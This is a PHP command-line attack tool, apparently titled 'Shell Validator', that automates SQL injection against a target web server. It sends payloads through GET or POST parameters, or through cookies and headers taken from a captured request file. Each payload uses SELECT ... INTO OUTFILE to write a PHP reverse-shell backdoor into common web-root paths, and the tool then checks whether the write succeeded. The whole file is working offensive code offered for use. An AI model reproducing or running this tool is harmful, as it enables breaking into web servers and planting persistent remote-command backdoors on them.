<?php

echo"                ____  _   _ _____ _     _                            \n";
echo"         __/\__/ ___|| | | | ____| |   | |                           \n";
echo"         \    /\___ \| |_| |  _| | |   | |                           \n";
echo"         /_  _\ ___) |  _  | |___| |___| |___                        \n";
echo"           \/  |____/|_| |_|_____|_____|_____|                       \n";
echo"                                                                     \n";
echo"        __     ___    _     ___ ____    _  _____ ___  ____           \n";
echo"        \ \   / / \  | |   |_ _|  _ \  / \|_   _/ _ \|  _ \__/\__    \n";
echo"         \ \ / / _ \ | |    | || | | |/ _ \ | || | | | |_) \    /    \n";
echo"          \ V / ___ \| |___ | || |_| / ___ \| || |_| |  _ </_  _\    \n";
echo"           \_/_/   \_\_____|___|____/_/   \_\_| \___/|_| \_\ \/      \n";
echo"                                                                     \n";
echo"                                                                     \n";
echo"                                                By: UnknownAD -_- \n";


$wordlist=array("/var/www/html/shell_magnify.php","c:/wamp/www/shell_magnify.php");
$http_file_interaction=0;
if(strpos(implode(" ",$argv),"--headers-file")){
  echo "[+] using http file interactive mode ...\n";
  $http_file_interaction=1;
  setup_http_injection($argv[2]);
}
if((!isset($argv[3])))
  {
    if($http_file_interaction==0){
    echo "[*] usage :\n

* default sql backdoor => mysql.php hostname/index method param (supperate the parameters with :: if you want more)\n
* headers injection => mysql.php --headers-file <your file> \n
* NOTE : use wireshark or burpsuite to gather received http headers (it must includes headers only) !!
    ";
    exit;
}}
    else{
            $url=explode("/",$argv[1]);
            $hostname=$url[0];
            echo $hostname;
            unset($url[0]);
            $index="/".implode('/',$url);
                //echo $index;
            $method=$argv[2];
            $param=$argv[3];
            echo "[!] Start Bruteforcing... \n";
}

           /// HEADERS INJECTION
function fetch_parameters($method,$line,$default="null"){
if ($method=="GET"){
  return explode("=",explode("?",str_replace(' HTTP/1.1',"",str_replace("GET ","",$line)))[1])[0];
}else{
  return explode("\n\n",$default)[1];
}
}
function setup_http_injection($file){
$cookies_list=array();
$user_agent="";
$headers_file=fopen($file,"r") or die("[!] can't find $file");
$array=explode("\n",fread($headers_file,20000));
$addition=array();
foreach($array as $item){
  if (strpos($item,"HTTP/1.1")){
    $index=str_replace(" HTTP/1.1",'',str_replace("GET ","",$item));
    echo "[!] Index detected : $index\n";
    if (strpos($item,"?")){
      $method="GET";
    }else{$method="POST";}
    echo "[!] Request Method : $method \n";
    $data=fetch_parameters($method,$item,implode("\n",$array))."\n";
    echo "[!] request parameter: ".$data;
  }
  if(strpos($item,":")){
    $line=explode(':',$item);
    if($line[0]=="Host"){
      $target_host=$line[1];
      echo "[!] Target Host Detected: $line[1]\n";
    } if($line[0]=="Cookie"){
      $cookies_line=$line[1];
      $cookies_list=use_cookies($cookies_line);
      //echo "[+] spitted parse: $line[1]";
      foreach($cookies_list as $e=>$fc){
      echo "[!] Cookies Detected: ".$fc."\n";}
      //echo $line[1]."\n";
      $cookie=true;
    }
  //print($line[0])."\n";
  if($line[0]=="User-Agent"){
    echo "[!] User Agent Header Detected\n";
  }
  else{
   $addition[$line[0]]="Null";
  }
}
}
http_attack($target_host,$index,$method,$cookies_list,$addition);  //($host,$index="/",$method,$cookies="",$others="")
fclose($headers_file);
}
function use_cookies($cookies){
  $fetched_cookies=array();
       //name=%22hi%22   ;    a=b
  if(strpos($cookies,";")){
    foreach(explode(";",$cookies) as $x){
  $name=explode("=",$x)[0];
  array_push($fetched_cookies,str_replace(" ","",$name)) ;   // ex : name=%22Unknown ad%22
}
  return $fetched_cookies;
}else{
return array(explode("=",$cookies)[0]);
  }
}
function http_attack($host,$index="/",$method,$cookies="",$addition=array()){
      global $wordlist;
      unset($addition["User-Agent"]);
      unset($addition["Host"]);
      unset($addition["Connection"]);
      if ($cookies!=""){
        unset($addition["Cookie"]);
      }
      $host=str_replace(" ","",$host);
      foreach($wordlist as $p){
        $p=str_replace("\n","",$p);
        $p="\"$p\"";
      $cmd=array("a"=>"1';select \" <?php $"."shell=socket_create(AF_INET,SOCK_STREAM,0);socket_connect($"."shell,'127.0.0.1',9999);while(1){socket_write($"."shell,shell_exec(socket_read($"."shell,1024)));}?>\" into outfile '$p'; \"","b"=>"1\";select \"<?php "."$"."shell=socket_create(AF_INET,SOCK_STREAM,0);socket_connect($"."shell,'127.0.0.1',9999);while(1){socket_write($"."shell,shell_exec(socket_read($"."shell,1024)));}?>\""." into outfile $p#");

      foreach($cmd as $command){
      $blank_="";
      $cookies_values="";
      foreach($cookies as $cookie){
      $cookies_values=$cookies_values.$cookie."=".urlencode($command).";";
          }
      if ($method=="GET"){
        $blank_=$blank_."$method $index"." HTTP/1.1\r\nHost: $host\r\nUser-Agent:$command\r\nCookie:$cookies_values"."\r\n";
      }

      if($addition!=array()){
        foreach(array_keys($addition) as $foreigne_header){
          $blank_.="$foreigne_header :.".urlencode($command)."\r\n";
        }
      }
      $blank_=$blank_."Connection: Close\r\n\r\n";
      $insidious=socket_create(AF_INET,SOCK_STREAM,0);
      socket_connect($insidious,$host,80);
      socket_write($insidious,$blank_);
      //echo socket_read($insidious,1024);
      socket_close($insidious);
      make_sure($host,$p);
    }}
}

              /// GET PARAMETERS INJECTION
              function make_sure($hostname,$p){
                if (shell_exec("php verify.php ".$hostname)=='1')
                  {
                    echo "[+] found : $p \n";exit;
                }else{
                    echo "[+] failed: $p\n";
                  }
              }
function get($param,$w){
    global $index;
    global $cmd;
    global $hostname,$method;
     // the buffer size is depending on the file size (20258)
    foreach($w as $p){

    $cmd=array("a"=>"1';select \" <?php $"."shell=socket_create(AF_INET,SOCK_STREAM,0);socket_connect($"."shell,'127.0.0.1',9999);while(1){socket_write($"."shell,shell_exec(socket_read($"."shell,1024)));}?>\" into outfile '$p'; #"
  ,"b"=>"1\";select \"<?php "."$"."shell=socket_create(AF_INET,SOCK_STREAM,0);socket_connect($"."shell,'127.0.0.1',9999);while(1){socket_write($"."shell,shell_exec(socket_read($"."shell,1024)));}?>\""." into outfile " ."\"$p\" #");
        foreach($cmd as $command){
            $api=socket_create(AF_INET,SOCK_STREAM,0);
            socket_connect($api,$hostname,80) or die('unable to reach the target host');
            $request="GET $index?$param=".urlencode($command)." HTTP/1.1\r\nHost: ".$hostname."\r\nConnection: Close\r\n\r\n";
            socket_write($api,$request);
            socket_close($api);
            make_sure($hostname,$p);

            }

      }}
function post($param,$w){
  global $index;
  global $cmd;
  global $hostname,$method;

   // the buffer size is depending on the file size (20258)
  foreach($w as $p){

  $cmd=array("a"=>"1';select \" <?php $"."shell=socket_create(AF_INET,SOCK_STREAM,0);socket_connect($"."shell,'127.0.0.1',9999);while(1){socket_write($"."shell,shell_exec(socket_read($"."shell,1024)));}?>\" into outfile '$p'; #"
  ,"b"=>"1\";select \"<?php "."$"."shell=socket_create(AF_INET,SOCK_STREAM,0);socket_connect($"."shell,'127.0.0.1',9999);while(1){socket_write($"."shell,shell_exec(socket_read($"."shell,1024)));}?>\""." into outfile " ."\"$p\" #");
      foreach($cmd as $command){
          $api=socket_create(AF_INET,SOCK_STREAM,0);
          socket_connect($api,$hostname,80) or die('unable to reach the target host');
          $request="POST $index HTTP/1.1\r\nHost: $hostname\r\nContent-Length:320\r\nContent-Type:application/x-www-form-urlencoded\r\nConnection: Close\r\n\r\n$param=$command";
          socket_write($api,$request);
          socket_close($api);
          make_sure($hostname,$p);
          }
    }
}
if ($argv[2]=='GET'){
  if (strpos($param,"::")){
    foreach(explode("::",$param) as $pr){
      get($pr,$wordlist);
    };
  }else{
    get($param,$wordlist);
}
}else{
  if (strpos($param,"::")){
    foreach(explode("::",$param) as $pr){
      echo "$pr\n";
      post($pr,$wordlist);
    }
  }else{
    post($param,$wordlist);
  }}
?>